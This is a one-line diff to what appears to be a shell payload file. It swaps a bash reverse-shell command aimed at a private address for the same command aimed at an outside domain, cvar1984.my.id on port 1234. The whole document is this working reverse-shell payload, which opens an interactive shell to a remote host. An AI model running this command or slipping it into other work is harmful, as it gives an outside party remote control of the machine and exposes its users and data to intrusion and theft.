@@ -1,1 +1,1 @@
-bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+bash -i >& /dev/tcp/cvar1984.my.id/1234 0>&1
